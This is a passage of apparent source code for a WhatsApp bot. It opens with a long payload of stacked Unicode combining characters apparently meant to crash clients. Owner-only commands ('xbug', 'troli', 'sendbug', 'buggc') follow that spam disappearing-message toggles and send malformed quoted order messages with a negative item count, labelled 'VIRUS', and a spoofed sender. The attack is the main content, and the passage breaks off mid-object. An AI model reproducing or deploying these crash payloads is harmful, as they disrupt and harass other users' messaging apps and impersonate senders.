ًًًًًًًًًًًًًًًًًًًًًًٍٍٍܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbo
t*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*Mythic
Xbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**
ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭*

`
kurzxd.sendMessage(from, wew, image, {thumbnail:fs.readFileSync(`lib/logo.jpg`),quoted: {key:{fromMe:false,participant:`0@s.whatsapp.net`, ...(from ? {remoteJid :"6285339388512-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`lib/logo.jpg`),"itemCount":-969769349,"status":"INQUIRY","surface":"CATALOG","message":`BODY-BOT `,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},caption: lzain,contextInfo: {"mentionedJid": [sender], "forwardingScore":999,"isForwarded":true}})
await setTimeout(() => {
reply('.bugr')
}, 5000)
                    break
                    case 'bughole':
                    if (!kurz.key.fromMe && !isOwner) return
				kurzxd.sendMessage(from, bughole(prefix), text)
await kurzxd.toggleDisappearingMessages(from)
break
case 'xbug':
if (!kurz.key.fromMe && !isOwner) return
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.toggleDisappearingMessages(from, 0)
kurzxd.sendMessage(from, `Xbug VIRUS`, text)
break
case 'troli':
if (!kurz.key.fromMe && !isOwner) return
kurzxd.toggleDisappearingMessages(from, 0)
		kurzxd.sendMessage(from, '▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒\x0a▒▒█▒▒▒▄██████████▄▒▒▒▒\x0a▒█▐▒▒▒████████████▒▒▒▒\x0a▒▌▐▒▒██▄▀██████▀▄██▒▒▒\x0a▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒\x0a▐┼▐▒▒██████████████▒▒▒\x0a▐▄▐████─▀▐▐▀█─█─▌▐██▄▒\x0a▒▒█████──────────▐███▌\x0a▒▒█▀▀██▄█─▄───▐─▄███▀▒\x0a▒▒█▒▒███████▄██████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒██████████████▒▒▒\x0a▒▒▒▒▒█████████▐▌██▌▒▒▒\x0a▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒\x0a▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒', MessageType.extendedText, {   	   
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid 
  },
  message: {
   orderMessage: {
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '⚡⚡',
    orderTitle: 'TROLI VIRUS', // Idk what this does  
    sellerJid: '0@s.whatsapp.net' // Seller    
   }
  }
 }
})
await kurzxd.toggleDisappearingMessages(from)
await kurzxd.toggleDisappearingMessages(from)
		     break		
case 'sendbug':
					if (!kurz.key.fromMe && !isOwner) return
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await kurzxd.toggleDisappearingMessages(from, 0)
}
sendFakeStatus(from, 'Sukses Send Bug Sebanyak '+args.join(' '), fake)
					break
					case 'buggc':
if (!kurz.key.fromMe && !isOwner) return
await kurzxd.toggleDisappearingMessages(from)
reply("mampus")
break
case 'katalogv3':
  if (!kurz.key.fromMe && !isOwner) return
   v3 = fs.readFileSync(`./src/catalog3.jpg`)
imeu = await kurzxd.prepareMessage('0@s.whatsapp.net', v3, image)

imeg = imeu.message.imageMessage
res = await kurzxd.prepareMessageFromContent(from,{
  "productMessage": {
  "product": {
  "productImage": imeg,
  "productId": "", 
  "title": katalog(prefix),
